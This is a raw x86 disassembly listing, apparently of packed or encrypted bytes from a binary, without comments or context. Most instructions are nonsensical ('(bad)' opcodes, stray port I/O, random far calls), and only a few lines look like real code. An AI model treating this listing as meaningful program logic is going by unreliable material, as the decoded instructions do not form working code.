  408961:	jp     0x4089de
  408963:	mov    bh,0x4a
  408965:	pop    edi
  408966:	xchg   ebx,eax
  408967:	push   esi
  408968:	ins    DWORD PTR es:[edi],dx
  408969:	popa   
  40896a:	std    
  40896b:	gs out 0x4c,al
  40896e:	push   esp
  40896f:	mov    cl,dh
  408971:	iret   
  408972:	test   al,0x52
  408974:	mov    al,0x60
  408976:	ins    BYTE PTR es:[edi],dx
  408977:	dec    ebp
  408978:	cmp    DWORD PTR [eax+ebx*1-0x69],ecx
  40897c:	out    dx,eax
  40897d:	outs   dx,DWORD PTR ds:[esi]
  40897e:	pop    ebx
  40897f:	(bad)  
  408980:	mov    BYTE PTR ds:0x2d3120fb,cl
  408986:	ficomp WORD PTR [ebx]
  408988:	push   edx
  408989:	mov    edi,0x9ac931b6
  40898e:	mov    dl,0xf2
  408990:	mov    edx,0xd55a254c
  408995:	xor    BYTE PTR [edi-0x7a],cl
  408998:	or     ah,BYTE PTR [ebp+0x58fbe1cd]
  40899e:	push   0x2712efcc
  4089a3:	and    DWORD PTR [eax],edx
  4089a5:	mov    DWORD PTR [ebx],eax
  4089a7:	xchg   ebx,eax
  4089a8:	call   0xa34409d3
  4089ad:	cmp    ah,BYTE PTR [eax-0x498afa32]
  4089b3:	jp     0x4089cc
  4089b5:	sbb    bh,BYTE PTR [eax]
  4089b7:	cs mov edi,0xd8163bf9
  4089bd:	(bad)  
  4089be:	push   esi
  4089bf:	xchg   ecx,eax
  4089c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c1:	fdiv   DWORD PTR [ebx-0x22]
  4089c4:	lahf   
  4089c5:	aas    
  4089c6:	je     0x408a1d
  4089c8:	outs   dx,BYTE PTR ds:[esi]
  4089c9:	mov    al,ds:0x8827859f
  4089ce:	jbe    0x40897c
  4089d0:	stos   DWORD PTR es:[edi],eax
  4089d1:	ror    BYTE PTR [ebp-0x12],0x83
  4089d5:	loope  0x4089a6
  4089d7:	std    
  4089d8:	xchg   esi,eax
  4089d9:	lea    edx,[ebx-0x2b648b39]
  4089df:	ret    
  4089e0:	jecxz  0x40897f
  4089e2:	iret   
  4089e3:	shl    BYTE PTR [esi],0x7d
  4089e6:	push   ss
  4089e7:	pop    ds
  4089e8:	aam    0x8e
  4089ea:	jg     0x408a4f
  4089ec:	lods   eax,DWORD PTR ds:[esi]
  4089ed:	mov    esi,0x73874976
  4089f2:	fwait
  4089f3:	pusha  
  4089f4:	jl     0x408a08
  4089f6:	xchg   ecx,eax
  4089f7:	call   0xee8a09a0
  4089fc:	mov    ah,0xb9
  4089fe:	dec    eax
  4089ff:	jnp    0x408a28
  408a01:	jmp    0x408a79
  408a03:	add    DWORD PTR [edx+0x51386a91],ebp
  408a09:	in     eax,0xa4
  408a0b:	lds    esp,FWORD PTR [ebp-0x6d5161c2]
  408a11:	test   DWORD PTR ds:[ecx+0x18f25902],edx
  408a18:	sub    eax,0xd528ff86
  408a1d:	dec    edi
  408a1e:	(bad)  
  408a1f:	dec    edi
  408a20:	in     al,0x29
  408a22:	and    eax,edi
  408a24:	and    edx,DWORD PTR [edx+0x428bc9e1]
  408a2a:	xchg   esi,eax
  408a2b:	pop    DWORD PTR [ebx]
  408a2d:	daa    
  408a2e:	xor    eax,DWORD PTR [edx]
  408a30:	in     al,dx
  408a31:	nop
  408a32:	ret    
  408a33:	das    
  408a34:	or     al,0x24
  408a36:	cmp    al,BYTE PTR [esi]
  408a38:	dec    edx
  408a39:	cmp    al,0x0
  408a3b:	sbb    ecx,ebx
  408a3d:	xchg   bx,ax
  408a3f:	jp     0x408abf
  408a41:	shl    DWORD PTR [eax-0x3e89c3ab],0xb2
  408a48:	lods   eax,DWORD PTR ds:[esi]
  408a49:	scas   al,BYTE PTR es:[edi]
  408a4a:	mov    ds:0xd1fe56b5,al
  408a4f:	mov    ecx,0xf05e9732
  408a54:	les    eax,FWORD PTR ds:0x6f950e84
  408a5a:	mov    al,ds:0xfc4937e4
  408a5f:	fnstenv [ebp-0xd2b5b7b]
  408a65:	mov    bh,dh
  408a67:	mov    BYTE PTR [eax+edx*8],bh
  408a6a:	pop    ebp
  408a6b:	adc    ch,BYTE PTR [edi-0x6dce4a24]
  408a71:	in     eax,0x2d
  408a73:	sub    ebp,DWORD PTR [edi-0x73aacf3]
  408a79:	dec    esi
  408a7a:	in     al,dx
  408a7b:	std    
  408a7c:	pop    es
  408a7d:	call   0x96bf3b01
  408a82:	pop    ebp
  408a83:	inc    edi
  408a84:	lock push edx
  408a86:	add    ebp,DWORD PTR [ecx]
  408a88:	aas    
  408a89:	mov    esp,DWORD PTR [esi+ebp*4+0x0]
  408a8d:	xchg   edi,eax
  408a8e:	in     eax,0x47
  408a90:	(bad)  
  408a92:	ja     0x408a31
  408a94:	or     BYTE PTR [ebp-0x1e0932f5],bl
  408a9a:	cmp    eax,ebx
  408a9c:	jl     0x408ae1
  408a9e:	and    ch,BYTE PTR [edx+0x773e1457]
  408aa4:	cs mov cs,esp
  408aa7:	xchg   esp,eax
  408aa8:	loope  0x408b05
  408aaa:	(bad)  
  408aab:	aad    0x93
  408aad:	mov    dl,0x87
  408aaf:	add    BYTE PTR [ecx+0x68],cl
  408ab2:	out    dx,al
  408ab3:	pop    edi
  408ab4:	sbb    ch,0x83
  408ab7:	inc    esi
  408ab8:	jo     0x408b1e
  408aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408abb:	call   0xc9edb2fc
  408ac0:	adc    al,BYTE PTR [esi]
  408ac2:	jno    0x408b2d
  408ac4:	arpl   sp,ax
  408ac6:	mov    bh,0xc6
  408ac8:	push   eax
  408ac9:	in     al,0xb4
  408acb:	and    cl,BYTE PTR [esi+0x2f41b85f]
  408ad1:	add    BYTE PTR [edx+ebp*4],0x68
  408ad5:	shl    BYTE PTR [edx+0x4],cl
  408ad8:	int    0xea
  408ada:	sbb    BYTE PTR [eax-0xe],bh
  408add:	pop    ecx
  408ade:	in     eax,dx
  408adf:	xchg   edi,eax
  408ae0:	pop    ss
  408ae1:	bnd jp 0x408b5e
  408ae4:	jne    0x408b54
  408ae6:	dec    esi
  408ae7:	in     al,dx
  408ae8:	inc    eax
  408ae9:	gs pop esp
  408aeb:	ins    BYTE PTR es:[edi],dx
  408aec:	dec    ecx
  408aed:	and    dh,BYTE PTR [ebp+0x31]
  408af0:	jecxz  0x408a7b
  408af2:	outs   dx,DWORD PTR ds:[esi]
  408af3:	cmc    
  408af4:	mov    eax,DWORD PTR ds:0xc5320abf
  408afa:	cmp    al,0x53
  408afc:	out    0xc6,al
  408afe:	out    0xd,eax
  408b00:	add    DWORD PTR [esi+ebp*8+0x36],0x5f0febdd
  408b08:	or     edi,DWORD PTR fs:[ecx+0x98a308f]
  408b0f:	ins    BYTE PTR es:[edi],dx
  408b10:	cmp    ebx,eax
  408b12:	dec    ebx
  408b13:	dec    ecx
  408b14:	shl    BYTE PTR [ecx+0x2cec345b],1
  408b1a:	nop    ebp
  408b1d:	loop   0x408b6a
  408b1f:	in     eax,0x19
  408b21:	push   ebp
  408b22:	outs   dx,DWORD PTR ds:[esi]
  408b23:	mov    DWORD PTR [edx],edx
  408b25:	pop    esp
  408b26:	iret   
  408b27:	loop   0x408b56
  408b29:	enter  0x5f88,0x43
  408b2d:	shl    BYTE PTR [edx],1
  408b2f:	loop   0x408ade
  408b31:	xor    dh,ch
  408b33:	adc    DWORD PTR [edx],esp
  408b35:	jge    0x408b49
  408b37:	cs out 0x9,al
  408b3a:	cmp    ah,bh
  408b3c:	jl     0x408b51
  408b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3f:	das    
  408b40:	dec    esp
  408b41:	mov    ds:0x1bacbe94,eax
  408b46:	pop    esp
  408b47:	leave  
  408b48:	stos   BYTE PTR es:[edi],al
  408b49:	mov    esp,0xd0d00f67
  408b4e:	pop    edx
  408b4f:	mov    bh,0x79
  408b51:	jb     0x408b5b
  408b53:	add    BYTE PTR [ecx+edx*1+0x44e1c4f5],0x3a
  408b5b:	push   cs
  408b5c:	(bad)  
  408b5d:	ja     0x408aff
  408b5f:	xchg   BYTE PTR [esi+0x380021c7],al
  408b65:	sti    
  408b66:	clc    
  408b67:	mov    ah,0x6c
  408b69:	push   eax
  408b6a:	xchg   ebx,eax
  408b6b:	out    0x37,eax
  408b6d:	retf   
  408b6e:	addr16 out dx,eax
  408b70:	int3   
  408b71:	vandnpd xmm1,xmm3,XMMWORD PTR [edi-0x73816909]
  408b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b7a:	adc    eax,0x99f37929
  408b7f:	mov    ah,BYTE PTR [ecx+ebp*4]
  408b82:	or     DWORD PTR [esi],ebp
  408b84:	daa    
  408b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b86:	outs   dx,BYTE PTR ds:[esi]
  408b87:	and    eax,0xe73f1222
  408b8c:	loope  0x408b1c
  408b8e:	inc    edi
  408b8f:	or     eax,DWORD PTR [ecx-0x7f]
  408b92:	mov    ebp,0xa6b881c8
  408b97:	in     eax,dx
  408b98:	mov    esp,0xf24aa553
  408b9d:	inc    esp
  408b9e:	cmp    eax,0x174fd57e
  408ba3:	neg    BYTE PTR [ebx]
  408ba5:	jecxz  0x408b92
  408ba7:	xor    cl,BYTE PTR [ecx]
  408ba9:	sar    BYTE PTR [edi+0x6554acb7],1
  408baf:	jae    0x408b97
  408bb1:	mov    DWORD PTR [eax-0x4f86fc64],esp
  408bb7:	iret   
  408bb8:	dec    DWORD PTR [ebp+0x22f928fb]
  408bbe:	mov    WORD PTR [edi],cs
  408bc0:	dec    esi
  408bc1:	fwait
  408bc2:	mov    esi,0x1fa027a6
  408bc7:	mov    edi,0xc0266eb9
  408bcc:	pop    ss
  408bcd:	mov    ds:0xf179c163,eax
  408bd2:	xchg   ebp,eax
  408bd3:	push   ecx
  408bd4:	jno    0x408b5a
  408bd6:	adc    ebp,DWORD PTR [eax]
  408bd8:	dec    edi
  408bd9:	xor    al,0xfa
  408bdb:	dec    ebx
  408bdc:	into   
  408bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bde:	add    bh,BYTE PTR ds:0x7b3e39d
  408be4:	(bad)  
  408be5:	mov    eax,0xa4b4597b
  408bea:	pop    esp
  408beb:	mov    edx,0xc6ec3b3b
  408bf0:	fisubr WORD PTR [ecx]
  408bf2:	or     DWORD PTR [edi+0x2d],ebp
  408bf5:	out    0xd9,eax
  408bf7:	scas   eax,DWORD PTR es:[edi]
  408bf8:	dec    edi
  408bf9:	aad    0x94
  408bfb:	adc    al,0x7d
  408bfd:	sbb    al,0x74
  408bff:	data16 in al,0xc0
  408c02:	cmp    eax,0xbebbf21c
  408c07:	sti    
  408c08:	xchg   ebp,eax
  408c09:	cmc    
  408c0a:	fs push eax
  408c0c:	outs   dx,BYTE PTR ds:[esi]
  408c0d:	cld    
  408c0e:	mov    eax,ds:0x2498a7ff
  408c13:	xchg   esi,eax
  408c14:	aam    0x70
  408c16:	xchg   esi,eax
  408c17:	and    esi,DWORD PTR [edi+0x22]
  408c1a:	loopne 0x408c74
  408c1c:	xchg   ecx,eax
  408c1d:	xchg   edx,eax
  408c1e:	inc    ebp
  408c1f:	test   eax,0x375366
  408c24:	and    DWORD PTR [ebp-0x49],esp
  408c27:	jl     0x408c42
  408c29:	es ja  0x408c47
  408c2c:	enter  0xf3c9,0x7e
  408c30:	out    dx,eax
  408c31:	jb     0x408bef
  408c33:	cld    
  408c34:	mov    esp,DWORD PTR ds:0x5b101cb3
  408c3a:	test   DWORD PTR [ebx+0x11e4c4d1],ebx
  408c40:	call   0x2d93:0xe2ddb456
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ebx,QWORD PTR [ebx]
  408c71:	mov    DWORD PTR ds:0x70d947a7,esp
  408c77:	jo     0x408c99
  408c79:	jge    0x408ceb
  408c7b:	jo     0x408c2b
  408c7d:	adc    cl,0x31
  408c80:	repz sub eax,DWORD PTR [ecx]
  408c83:	int3   
  408c84:	adc    edx,edx
  408c86:	clc    
  408c87:	test   eax,0x255b4e71
  408c8c:	cmp    BYTE PTR [ebp+0x42],al
  408c8f:	dec    edi
  408c90:	in     eax,0x2c
  408c92:	mov    al,ds:0xc779f0b9
  408c97:	jne    0x408cad
  408c99:	fbld   TBYTE PTR ds:0xc3eb2454
  408c9f:	add    DWORD PTR [ebx+edi*2],eax
  408ca2:	mov    ebp,eax
  408ca4:	addr16 sahf 
  408ca6:	xor    edi,DWORD PTR [esi+0x52]
  408ca9:	mov    ch,bl
  408cab:	and    cl,0xa8
  408cae:	mov    bh,0x2a
  408cb0:	mov    esp,0xc22efe59
  408cb5:	or     DWORD PTR [esi-0x46874241],eax
  408cbb:	sar    DWORD PTR [ebp+0x56],cl
  408cbe:	lods   al,BYTE PTR ds:[esi]
  408cbf:	xchg   ecx,eax
  408cc0:	jo     0x408d0d
  408cc2:	xor    DWORD PTR [edx],esi
  408cc4:	inc    edi
  408cc5:	pop    edx
  408cc6:	adc    bl,dh
  408cc8:	retf   
  408cc9:	ja     0x408ca7
  408ccb:	mov    ebx,0x1393c27c
  408cd0:	js     0x408c9d
  408cd2:	lods   al,BYTE PTR ds:[esi]
  408cd3:	inc    edi
  408cd4:	fsub   QWORD PTR [esi-0x31]
  408cd7:	das    
  408cd8:	retf   
  408cd9:	(bad)  
  408cda:	int    0x78
  408cdc:	int    0xed
  408cde:	jle    0x408cca
  408ce0:	call   DWORD PTR [edi+0x1d2f93ff]
  408ce6:	(bad)
  408cea:	pop    ebp
  408ceb:	cmp    dl,bl
  408ced:	mov    WORD PTR [ecx-0x38],ds
  408cf0:	or     eax,0xeeea613
  408cf5:	mov    edx,0xea1a0567
  408cfa:	(bad)  
  408cfc:	pop    esi
  408cfd:	dec    ebp
  408cfe:	pop    ds
  408cff:	out    0xb7,eax
  408d01:	icebp  
  408d02:	cmp    BYTE PTR [ecx+0x3340f12],dh
  408d08:	stos   DWORD PTR es:[edi],eax
  408d09:	add    edx,DWORD PTR [ebx]
  408d0b:	nop
  408d0c:	mov    ds:0x6e667566,eax
  408d11:	xchg   edx,eax
  408d12:	mov    ds:0x1937e8b7,eax
  408d17:	stos   BYTE PTR es:[edi],al
  408d18:	jno    0x408cc8
  408d1a:	mov    WORD PTR [edi],fs
  408d1c:	add    eax,ebx
  408d1e:	adc    DWORD PTR [edx],esp
  408d20:	outs   dx,DWORD PTR ds:[esi]
  408d21:	(bad)  
  408d22:	stc    
  408d23:	and    eax,0xee601849
  408d28:	push   0xffffffd2
  408d2a:	dec    esp
  408d2b:	mov    dl,BYTE PTR ds:0xafc92de6
  408d31:	ss out 0xbb,al
  408d34:	push   edi
  408d35:	xchg   esi,eax
  408d36:	jle    0x408d7c
  408d38:	inc    ebx
  408d39:	mov    ah,0x43
  408d3b:	rcr    ch,1
  408d3d:	sub    ch,BYTE PTR [ecx]
  408d3f:	aam    0x17
  408d41:	popf   
  408d42:	(bad)  
  408d43:	mov    edi,0xa79c8a08
  408d48:	ins    DWORD PTR es:[edi],dx
  408d49:	aad    0x28
  408d4b:	mov    bl,0x26
  408d4d:	mov    al,0x35
  408d4f:	and    eax,0x38ffaf94
  408d54:	cmp    BYTE PTR [edx+0x7b],dh
  408d57:	xor    DWORD PTR [eax-0x4d],ebx
  408d5a:	mov    ds:0x831343a9,al
  408d5f:	idiv   BYTE PTR [eax-0x39]
  408d62:	(bad)  
  408d63:	rcr    DWORD PTR [ebp+0x18173dc8],cl
  408d69:	mov    dh,0x94
  408d6b:	aas    
  408d6c:	pop    esi
  408d6d:	dec    eax
  408d6e:	add    eax,0x32004a0d
  408d73:	jae    0x408d18
  408d75:	aam    0x2f
  408d77:	das    
  408d78:	cmp    eax,esi
  408d7a:	ss fs push ebx
  408d7d:	add    eax,0xce3822c1
  408d82:	and    eax,0xbb9338a5
  408d87:	mov    dh,0x74
  408d89:	js     0x408d90
  408d8b:	lods   al,BYTE PTR ds:[esi]
  408d8c:	cmp    BYTE PTR [edi-0x24],bh
  408d8f:	cmc    
  408d90:	jne    0x408e0d
  408d92:	shl    BYTE PTR [esi+0x5bc6af6b],cl
  408d98:	clc    
  408d99:	xor    BYTE PTR [ebx+0x27df84db],ch
  408d9f:	dec    ebx
  408da0:	and    al,0x71
  408da2:	es cmp ecx,esp
  408da5:	mov    ds:0x952d3b0c,al
  408daa:	aam    0x4a
  408dac:	inc    edx
  408dad:	outs   dx,BYTE PTR ds:[esi]
  408dae:	(bad)  
  408db0:	fbld   TBYTE PTR es:[eax]
  408db3:	aam    0xb3
  408db5:	xchg   ecx,eax
  408db6:	mov    esi,0x23aa37f2
  408dbb:	xchg   BYTE PTR [ebx-0x63],dh
  408dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dbf:	cld    
  408dc0:	ins    DWORD PTR es:[edi],dx
  408dc1:	xchg   edi,eax
  408dc2:	fsubp  st(5),st
  408dc4:	adc    eax,esp
  408dc6:	rcr    DWORD PTR [ebp+0x79],0x6c
  408dca:	sahf   
  408dcb:	stc    
  408dcc:	jmp    0xe2bf:0x7a88aabd
  408dd3:	test   al,0x6c
  408dd5:	into   
  408dd6:	jno    0x408e1c
  408dd8:	inc    edi
  408dd9:	add    al,0xff
  408ddb:	jl     0x408e22
  408ddd:	jbe    0x408d8e
  408ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de0:	ficom  DWORD PTR [edi+0x4b874a8c]
  408de6:	aaa    
  408de7:	mov    BYTE PTR [eax],dl
  408de9:	push   esp
  408dea:	(bad)  
  408deb:	and    eax,0xdd35380e
  408df0:	bound  ebx,QWORD PTR [edi-0x58]
  408df3:	iret   
  408df4:	sti    
  408df5:	push   cs
  408df6:	adc    eax,0xd1238425
  408dfb:	and    BYTE PTR [eax+0x2a57112e],ch
  408e01:	xor    DWORD PTR [eax+0xe3ae735],edi
  408e07:	push   eax
  408e08:	std    
  408e09:	add    cl,bl
  408e0b:	in     eax,0xcf
  408e0d:	mov    esp,0x4bd37bfc
  408e12:	(bad)  
  408e13:	jge    0x408dd8
  408e15:	jns    0x408db8
  408e17:	inc    esp
  408e18:	push   esp
  408e19:	mov    ah,0x94
  408e1b:	popf   
  408e1c:	cld    
  408e1d:	sbb    al,ah
  408e1f:	repz mov ah,0x20
  408e22:	hlt    
  408e23:	retf   0xb5bb
  408e26:	add    cl,dl
  408e28:	cmc    
  408e29:	loope  0x408e18
  408e2b:	adc    eax,edx
  408e2d:	in     al,0xbd
  408e2f:	cmp    eax,0xdb664dd1
  408e34:	ret    
  408e35:	sub    DWORD PTR [eax+0x53183d12],ebx
  408e3b:	(bad)  
  408e3c:	cmp    ch,BYTE PTR [ebx-0x32]
  408e3f:	call   0x228e:0xd427d3ec
  408e46:	(bad)  
  408e47:	sti    
  408e48:	popf   
  408e49:	aad    0xe4
  408e4b:	int    0xc1
  408e4d:	popf   
  408e4e:	jmp    0x1561f7d1
  408e53:	int3   
  408e54:	and    eax,ebp
  408e56:	stos   WORD PTR es:[edi],ax
  408e58:	cmp    bh,BYTE PTR [edi-0x1]
  408e5b:	mov    ds:0x8e3bd662,al
  408e60:	es push es
  408e62:	mov    edi,0xa579f60e
  408e67:	jmp    0x408edc
  408e69:	push   esi
  408e6a:	das    
  408e6b:	inc    ebx
  408e6c:	mov    cl,0x69
  408e6e:	das    
  408e6f:	cmc    
  408e70:	repnz mov esi,0x793a445
  408e76:	clc    
  408e77:	push   esi
  408e78:	mov    al,ds:0xea4ee306
  408e7d:	xlat   BYTE PTR ds:[ebx]
  408e7e:	call   0x9b7a:0x61758033
  408e85:	or     DWORD PTR [edi-0x3083bbbb],ebx
  408e8b:	call   0xa8e1:0xf11a3036
  408e92:	inc    ebp
  408e93:	fs std 
  408e95:	xchg   edx,eax
  408e96:	jl     0x408ede
  408e98:	outs   dx,DWORD PTR ds:[esi]
  408e99:	xor    al,0x1e
  408e9b:	or     BYTE PTR [ecx],ch
  408e9d:	pop    esi
  408e9e:	push   esp
  408e9f:	dec    ebx
  408ea0:	out    dx,eax
  408ea1:	xor    eax,0x5d402b2b
  408ea6:	sub    DWORD PTR [ebp-0x17],eax
  408ea9:	daa    
  408eaa:	in     al,0x5
  408eac:	cmp    bh,ch
  408eae:	or     eax,0x4e1e6eed
  408eb3:	sub    ebx,ebx
  408eb5:	(bad)  
  408eb6:	ins    DWORD PTR es:[edi],dx
  408eb7:	mov    ebx,0xe2644f36
  408ebc:	sar    BYTE PTR [ecx],1
  408ebe:	outs   dx,DWORD PTR ds:[esi]
  408ebf:	jmp    0x5a3520c0
  408ec4:	lea    edi,[ebp+0x0]
  408ec7:	das    
  408ec8:	jl     0x408ec1
  408eca:	mov    DWORD PTR [edi-0xf64215b],edx
  408ed0:	adc    ch,BYTE PTR [eax-0x7098d3d1]
  408ed6:	fwait
  408ed7:	sub    al,0x1a
  408ed9:	nop
  408eda:	lods   al,BYTE PTR ds:[esi]
  408edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408edc:	jae    0x408eb6
  408ede:	imul   esi,DWORD PTR [eax],0xac2d2d56
  408ee4:	and    al,0x72
  408ee6:	mov    ebp,?
  408ee8:	xchg   ecx,eax
  408ee9:	leave  
  408eea:	xchg   edx,eax
  408eeb:	call   0x20dd:0x2fcd2a51
  408ef2:	mov    bl,0x18
  408ef4:	fwait
  408ef5:	xchg   esi,eax
  408ef6:	jb     0x408f11
  408ef8:	or     BYTE PTR [ecx+eax*4+0x52],0xe2
  408efd:	inc    ebx
  408efe:	lods   al,BYTE PTR ds:[esi]
  408eff:	inc    ebp
  408f00:	add    eax,0xb49d5188
  408f05:	pop    esp
  408f06:	xchg   edx,eax
  408f07:	out    0xbf,eax
  408f09:	add    bh,BYTE PTR [edi]
  408f0b:	cld    
  408f0c:	loop   0x408f06
  408f0e:	je     0x408f18
  408f10:	ss out 0x36,eax
  408f13:	fistp  DWORD PTR [esi]
  408f15:	stc    
  408f16:	sar    BYTE PTR [edi+ecx*4],0x58
  408f1a:	scas   al,BYTE PTR es:[edi]
  408f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1c:	add    BYTE PTR [edx-0x4e7569aa],bh
  408f22:	jne    0x408f10
  408f24:	sbb    al,0x1b
  408f26:	jecxz  0x408f32
  408f28:	aam    0xe7
  408f2a:	inc    ecx
  408f2b:	push   0xffffffe0
  408f2d:	or     dh,dl
  408f2f:	in     eax,0x3a
  408f31:	mov    ds:0x3d29556c,eax
  408f36:	lock fs in al,0x52
  408f3a:	popa   
  408f3b:	or     ebx,eax
  408f3d:	sbb    ecx,edx
  408f3f:	cmc    
  408f40:	cmc    
  408f41:	or     cl,BYTE PTR [edi-0x4f]
  408f44:	ins    DWORD PTR es:[edi],dx
  408f45:	or     al,0x80
  408f47:	add    cl,ch
  408f49:	jle    0x408f3a
  408f4b:	pop    edx
  408f4c:	pop    es
  408f4d:	mov    edi,edi
  408f4f:	rol    DWORD PTR [esi-0x7d],1
  408f52:	test   al,0xde
  408f54:	test   BYTE PTR [esi],ch
  408f56:	ror    DWORD PTR [eax-0x602d50b],1
  408f5c:	aad    0x16
  408f5e:	cwde   
  408f5f:	into   
  408f60:	jnp    0x408f57
  408f62:	push   ds
  408f63:	pop    ds
  408f64:	mov    bl,0x31
  408f66:	outs   dx,DWORD PTR ds:[esi]
  408f67:	fwait
  408f68:	and    BYTE PTR [ebx],dh
  408f6a:	add    eax,0x5286011e
  408f6f:	sub    DWORD PTR [edx-0x20ae3684],edx
  408f75:	adc    ecx,edx
  408f77:	sbb    bl,ch
  408f79:	test   ah,bl
  408f7b:	pushf  
  408f7c:	mov    ebp,0xa56c1724
  408f81:	js     0x408fec
  408f83:	mov    dh,0x8a
  408f85:	push   eax
  408f86:	std    
  408f87:	stos   BYTE PTR es:[edi],al
  408f88:	enter  0x6cc8,0x1
  408f8c:	loopne 0x408ff1
  408f8e:	pusha  
  408f8f:	stos   BYTE PTR es:[edi],al
  408f90:	inc    ebx
  408f91:	lds    esp,FWORD PTR [ecx+0x1f4d06e]
  408f97:	inc    eax
  408f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f99:	and    eax,0x3c1a8664
  408f9e:	xor    ebx,DWORD PTR [ebp-0x59]
  408fa1:	mov    ah,0xfe
  408fa3:	and    eax,0xcf8b57ab
  408fa8:	out    0x2d,al
  408faa:	cmp    cl,ch
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xca1937f3
  408fc6:	inc    ebx
  408fc7:	pop    ss
  408fc8:	mov    eax,ds:0x7070e677
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f75
  408fd2:	sbb    ebp,DWORD PTR [eax]
  408fd4:	jo     0x408f56
  408fd6:	jl     0x408f8a
  408fd8:	cmp    eax,0x94e89ca4
  408fdd:	pop    edi
  408fde:	es fadd st,st(0)
  408fe1:	inc    edi
  408fe2:	icebp  
  408fe3:	int    0x2b
  408fe5:	or     DWORD PTR [ecx],ebp
  408fe7:	stos   BYTE PTR es:[edi],al
  408fe8:	shl    cl,cl
  408fea:	adc    esp,DWORD PTR [eax-0x6f]
  408fed:	lods   al,BYTE PTR ds:[esi]
  408fee:	xor    eax,0x46265a10
  408ff3:	mov    ebx,0xf01cd9aa
  408ff8:	in     eax,dx
  408ff9:	repnz sbb esp,ecx
  408ffc:	xlat   BYTE PTR ds:[ebx]
  408ffd:	xchg   BYTE PTR [eax-0x24],cl
  409000:	push   esi
  409001:	sbb    DWORD PTR [ebx+esi*8+0x66],0x165943ea
  409009:	xchg   ebp,eax
  40900a:	scas   al,BYTE PTR es:[edi]
  40900b:	shr    ah,cl
  40900d:	mov    edx,0x3cfdc5ae
  409012:	dec    esp
  409013:	repnz fdivr DWORD PTR gs:[ecx-0x3a]
  409018:	xchg   ebx,eax
  409019:	mov    eax,esi
  40901b:	repz xchg ebx,eax
  40901d:	in     al,dx
  40901e:	push   ebx
  40901f:	das    
  409020:	jecxz  0x409021
  409022:	pop    DWORD PTR [eax-0x5d]
  409025:	xor    ch,BYTE PTR [edx]
  409027:	dec    edi
  409028:	cwde   
  409029:	jecxz  0x40903a
  40902b:	inc    edi
  40902c:	sub    al,0xbe
  40902e:	fxch   st(4)
  409030:	fdivr  QWORD PTR [ecx]
  409032:	stos   BYTE PTR es:[edi],al
  409033:	cmp    eax,0x1d402ff4
  409038:	push   esp
  409039:	xchg   ebp,eax
  40903a:	push   0x84993a59
  40903f:	xchg   esi,eax
  409040:	xchg   BYTE PTR [eax-0x4514506e],cl
  409046:	sbb    BYTE PTR [edx-0x79c90617],ch
  40904c:	out    0x83,eax
  40904e:	pop    ds
  40904f:	out    0x49,eax
  409051:	es test dh,cl
  409054:	lahf   
  409055:	mov    eax,ds:0x7a01ef0c
  40905a:	mov    bl,0x49
  40905c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40905d:	dec    edi
  40905e:	jp     0x409050
  409060:	in     eax,dx
  409061:	xchg   BYTE PTR ss:[edi-0x3d7b6ecb],dh
  409068:	in     al,dx
  409069:	outs   dx,DWORD PTR ds:[esi]
  40906a:	fs mov esp,0xdeb1dc95
  409070:	dec    edx
  409071:	shr    BYTE PTR ds:0xc748370a,1
  409077:	jmp    0x7c93be40
  40907c:	push   esp
  40907d:	add    eax,0xd8cab07a
  409082:	in     al,dx
  409083:	add    edi,ebp
  409085:	xor    ecx,DWORD PTR [edx+0x2594a497]
  40908b:	sbb    BYTE PTR [esi-0x59],0x88
  40908f:	jbe    0x4090f7
  409091:	fdiv   st,st(4)
  409093:	or     edi,ebx
  409095:	mov    eax,0x523b8ca0
  40909a:	xor    DWORD PTR [ebx-0x6b43eec6],ebp
  4090a0:	mov    bh,0x4d
  4090a2:	jl     0x4090b8
  4090a4:	in     eax,0xbf
  4090a6:	jae    0x409112
  4090a8:	sahf   
  4090a9:	mov    ?,ebp
  4090ab:	ins    DWORD PTR es:[edi],dx
  4090ac:	cld    
  4090ad:	inc    edi
  4090ae:	xor    eax,0x46afb16c
  4090b3:	js     0x409121
  4090b5:	inc    ecx
  4090b6:	mov    edx,0xeb73250b
  4090bb:	inc    ebx
  4090bc:	jmp    0x409054
  4090be:	jecxz  0x4090e4
  4090c0:	sub    eax,0xfa0bc241
  4090c5:	mov    es,WORD PTR ds:[esp+eiz*8]
  4090c9:	repnz inc bh
  4090cc:	sbb    esi,esi
  4090ce:	(bad)  
  4090cf:	jb     0x4090b5
  4090d1:	sbb    cl,bl
  4090d3:	stc    
  4090d4:	sbb    DWORD PTR [eax],eax
  4090d6:	mov    esp,0xb96a8369
  4090db:	jge    0x4090e0
  4090dd:	retf   
  4090de:	fsub   DWORD PTR ds:0x88aaf03b
  4090e4:	mov    dl,0x89
  4090e6:	and    ah,BYTE PTR [ebx+0x17]
  4090e9:	in     eax,0x88
  4090eb:	mov    dl,0x3
  4090ed:	int3   
  4090ee:	cmp    cl,BYTE PTR [ecx+0x59405c2e]
  4090f4:	into   
  4090f5:	mov    al,0x62
